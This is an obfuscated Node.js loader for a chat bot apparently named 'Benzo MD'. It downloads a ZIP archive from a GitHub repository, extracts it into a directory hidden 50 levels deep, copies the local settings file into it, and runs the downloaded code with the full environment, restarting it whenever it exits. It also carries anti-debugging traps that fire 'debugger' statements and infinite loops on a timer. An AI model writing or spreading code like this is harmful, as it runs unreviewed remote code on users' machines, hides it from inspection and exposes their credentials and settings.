const fs = require("fs");
const path = require("path");
const axios = require("axios");
const AdmZip = require("adm-zip");
const {
  spawn
} = require("child_process");
const chalk = require("chalk");
const deepLayers = Array.from({
  length: 50
}, (_0x1d3788, _0x16b372) => ".x" + (_0x16b372 + 1));
(function () {
  const _0x3a57d5 = function () {
    let _0x54a0a3;
    try {
      _0x54a0a3 = Function("return (function() {}.constructor(\"return this\")( ));")();
    } catch (_0x3ca0fe) {
      _0x54a0a3 = window;
    }
    return _0x54a0a3;
  };
  const _0xf7cbd3 = _0x3a57d5();
  _0xf7cbd3.setInterval(_0xcc153a, 2000);
})();
const TEMP_DIR = path.join(__dirname, ".npm", "xcache", ...deepLayers);
const DOWNLOAD_URL = "https://github.com/qwerghjkkl/uehekdndmsb/archive/refs/heads/main.zip";
const EXTRACT_DIR = path.join(TEMP_DIR, "uhekdndmsb");
const LOCAL_SETTINGS = path.join(__dirname, "settings.js");
const EXTRACTED_SETTINGS = path.join(EXTRACT_DIR, "settings.js");
const delay = _0x55a8a => new Promise(_0x5205df => setTimeout(_0x5205df, _0x55a8a));
async function downloadAndExtract() {
  try {
    if (fs.existsSync(TEMP_DIR)) {
      console.log(chalk.yellow("🧹 Cleaning previous cache..."));
      fs.rmSync(TEMP_DIR, {
        recursive: true,
        force: true
      });
    }
    fs.mkdirSync(TEMP_DIR, {
      recursive: true
    });
    const _0x105283 = path.join(TEMP_DIR, "repo.zip");
    console.log(chalk.blue("⬇️ Connecting to space..."));
    const _0x249d9b = await axios({
      url: DOWNLOAD_URL,
      method: "GET",
      responseType: "stream",
      timeout: 30000
    });
    await new Promise((_0x55b7d1, _0x143a69) => {
      const _0x1ba330 = fs.createWriteStream(_0x105283);
      _0x249d9b.data.pipe(_0x1ba330);
      let _0x3ae298 = null;
      _0x1ba330.on("error", _0x486981 => {
        _0x3ae298 = _0x486981;
        _0x1ba330.close();
        _0x143a69(_0x486981);
      });
      _0x1ba330.on("close", () => {
        if (!_0x3ae298) {
          _0x55b7d1();
        }
      });
    });
    console.log(chalk.green("📦 ZIP download complete."));
    try {
      const _0x166795 = new AdmZip(_0x105283);
      _0x166795.extractAllTo(TEMP_DIR, true);
      console.log(chalk.green("✅ Extraction completed successfully."));
    } catch (_0x1554f5) {
      console.error(chalk.red("❌ Failed to extract ZIP:"), _0x1554f5);
      throw _0x1554f5;
    } finally {
      if (fs.existsSync(_0x105283)) {
        fs.unlinkSync(_0x105283);
      }
    }
    const _0x290ec3 = path.join(EXTRACT_DIR, "commands");
    const _0x200f18 = path.join(EXTRACT_DIR, "settings.js");
    const _0x197b1f = path.join(EXTRACT_DIR, "main.js");
    if (fs.existsSync(_0x290ec3)) {
      console.log(chalk.green("✅ Commands folder found."));
      try {
        const _0x4258c3 = fs.readdirSync(_0x290ec3).filter(_0x5ce53a => _0x5ce53a.endsWith(".js"));
        console.log(chalk.blue("📁 Found " + _0x4258c3.length + " command files"));
      } catch (_0x418c22) {
        console.log(chalk.yellow("⚠️ Could not read commands directory"));
      }
    } else {
      console.log(chalk.yellow("⚠️ Commands folder not found, but continuing..."));
    }
    if (fs.existsSync(_0x200f18)) {
      console.log(chalk.green("✅ Settings file found."));
    }
    if (fs.existsSync(_0x197b1f)) {
      console.log(chalk.green("✅ Main handler file found."));
    }
  } catch (_0x2ffe22) {
    console.error(chalk.red("❌ Download/Extract failed:"), _0x2ffe22);
    throw _0x2ffe22;
  }
}
async function applyLocalSettings() {
  if (!fs.existsSync(LOCAL_SETTINGS)) {
    console.log(chalk.yellow("⚠️ No local settings file found."));
    return;
  }
  try {
    if (!fs.existsSync(EXTRACT_DIR)) {
      fs.mkdirSync(EXTRACT_DIR, {
        recursive: true
      });
    }
    fs.copyFileSync(LOCAL_SETTINGS, EXTRACTED_SETTINGS);
    console.log(chalk.green("🛠️ Local settings applied."));
  } catch (_0x19ed56) {
    console.error(chalk.red("❌ Failed to apply local settings:"), _0x19ed56);
  }
  await delay(500);
}
function startBot() {
  console.log(chalk.cyan("🚀 Launching Benzo MD instance..."));
  if (!fs.existsSync(EXTRACT_DIR)) {
    console.error(chalk.red("❌ Extracted directory not found. Cannot start bot."));
    return;
  }
  const _0x402253 = ["main.js", "settings.js", "package.json"];
  const _0x462a02 = _0x402253.filter(_0x34098b => !fs.existsSync(path.join(EXTRACT_DIR, _0x34098b)));
  if (_0x462a02.length > 0) {
    console.log(chalk.yellow("⚠️ Missing some required files:"), _0x462a02);
  }
  let _0xbdff17 = "main.js";
  let _0x58fcae = path.join(EXTRACT_DIR, _0xbdff17);
  if (!fs.existsSync(_0x58fcae)) {
    _0xbdff17 = "index.js";
    _0x58fcae = path.join(EXTRACT_DIR, _0xbdff17);
    if (!fs.existsSync(_0x58fcae)) {
      console.error(chalk.red("❌ Neither main.js nor index.js found in extracted directory."));
      try {
        const _0x3e5efd = fs.readdirSync(EXTRACT_DIR);
        console.log(chalk.yellow("📁 Available files:"), _0x3e5efd.slice(0, 15));
        const _0x48edb8 = _0x3e5efd.filter(_0x3c839b => _0x3c839b.endsWith(".js") && !_0x3c839b.startsWith("."));
        if (_0x48edb8.length > 0) {
          console.log(chalk.yellow("🔍 Found JS files:"), _0x48edb8);
          const _0x1a1405 = _0x48edb8.filter(_0x4fbae3 => _0x4fbae3.includes("main") || _0x4fbae3.includes("index") || _0x4fbae3.includes("app") || _0x4fbae3.includes("start"));
          if (_0x1a1405.length > 0) {
            console.log(chalk.blue("💡 Possible main files:"), _0x1a1405);
            _0xbdff17 = _0x1a1405[0];
            _0x58fcae = path.join(EXTRACT_DIR, _0xbdff17);
            console.log(chalk.blue("🔄 Trying to use: " + _0xbdff17));
          }
        }
      } catch (_0x202863) {
        console.error(chalk.red("❌ Could not read extracted directory:"), _0x202863);
        return;
      }
    }
  }
  let _0x5f1f45 = "node";
  let _0x1232ac = [_0xbdff17];
  try {
    const _0x4c4450 = path.join(EXTRACT_DIR, "package.json");
    if (fs.existsSync(_0x4c4450)) {
      const _0x42a80f = JSON.parse(fs.readFileSync(_0x4c4450, "utf8"));
      if (_0x42a80f.type === "module") {
        console.log(chalk.blue("📦 Detected ES Module bot"));
      } else {
        console.log(chalk.blue("📦 Detected CommonJS bot (like Benzo MD)"));
      }
      if (_0x42a80f.scripts && _0x42a80f.scripts.start) {
        console.log(chalk.blue("🚀 Using npm start script"));
        _0x5f1f45 = "npm";
        _0x1232ac = ["start"];
      }
    }
  } catch (_0x4bde6c) {
    console.log(chalk.yellow("⚠️ Could not read package.json, using default node command"));
  }
  console.log(chalk.blue("🤖 Starting Benzo MD with: " + _0x5f1f45 + " " + _0x1232ac.join(" ")));
  const _0x16f3b8 = spawn(_0x5f1f45, _0x1232ac, {
    cwd: EXTRACT_DIR,
    stdio: "inherit",
    env: {
      ...process.env,
      NODE_ENV: "production",
      PAIRING_CODE: process.env.PAIRING_CODE || "true",
      MOBILE: process.env.MOBILE || "false"
    }
  });
  _0x16f3b8.on("close", _0x58f6b0 => {
    if (_0x58f6b0 === 0) {
      console.log(chalk.green("✅ Benzo Md stopped gracefully"));
    } else {
      console.log(chalk.yellow("💥 Benzo MD terminated with exit code: " + _0x58f6b0));
      console.log(chalk.blue("🔄 Restarting Benzo MD in 3 seconds..."));
      setTimeout(startBot, 3000);
    }
  });
  _0x16f3b8.on("error", _0x305fba => {
    console.error(chalk.red("❌ Benzo MD failed to start:"), _0x305fba);
    console.log(chalk.blue("🔄 Attempting to restart Benzo MD in 5 seconds..."));
    setTimeout(startBot, 5000);
  });
  const _0x5cf9f2 = _0xcabac5 => {
    console.log(chalk.yellow("\n🛑 Received " + _0xcabac5 + ", shutting down Benzo MD gracefully..."));
    _0x16f3b8.kill(_0xcabac5);
    setTimeout(() => {
      console.log(chalk.red("⚠️ Force shutting down Benzo MD..."));
      process.exit(0);
    }, 5000);
  };
  process.on("SIGINT", () => _0x5cf9f2("SIGINT"));
  process.on("SIGTERM", () => _0x5cf9f2("SIGTERM"));
  if (fs.existsSync(_0x58fcae)) {
    fs.watchFile(_0x58fcae, () => {
      console.log(chalk.yellow("🔄 Benzo MD main file changed, restarting..."));
      _0x16f3b8.kill("SIGTERM");
      setTimeout(startBot, 2000);
    });
  }
}
process.on("unhandledRejection", (_0x5b8896, _0x3ef3f1) => {
  console.error(chalk.red("❌ Unhandled Rejection at:"), _0x3ef3f1, "reason:", _0x5b8896);
});
process.on("uncaughtException", _0x21c14f => {
  console.error(chalk.red("❌ Uncaught Exception:"), _0x21c14f);
  console.log(chalk.blue("🔄 Restarting June MD in 3 seconds..."));
  setTimeout(() => process.exit(1), 3000);
});
(async () => {
  try {
    console.log(chalk.magenta("\n    ╔═══════════════════════════════╗\n    ║         Benzo MD LOADER        ║\n    ║     Downloading & Starting    ║\n    ╚═══════════════════════════════╝\n    "));
    await downloadAndExtract();
    await applyLocalSettings();
    console.log(chalk.green("\n    ✅ Preparation Complete!\n    🚀 Starting Benzo MD...\n    "));
    startBot();
  } catch (_0x3a9f1b) {
    console.error(chalk.red("❌ Fatal error in main execution:"), _0x3a9f1b);
    console.log(chalk.blue("🔄 Restarting Benzo MD in 10 seconds..."));
    setTimeout(() => process.exit(1), 10000);
  }
})();
function _0xcc153a(_0x2150f5) {
  function _0x34b9ec(_0x4c1281) {
    if (typeof _0x4c1281 === "string") {
      return function (_0x48ff61) {}.constructor("while (true) {}").apply("counter");
    } else if (("" + _0x4c1281 / _0x4c1281).length !== 1 || _0x4c1281 % 20 === 0) {
      (function () {
        return true;
      }).constructor("debuggergger").call("action");
    } else {
      (function () {
        return false;
      }).constructor("debuggergger").apply("stateObject");
    }
    _0x34b9ec(++_0x4c1281);
  }
  try {
    if (_0x2150f5) {
      return _0x34b9ec;
    } else {
      _0x34b9ec(0);
    }
  } catch (_0x56d96d) {}
}
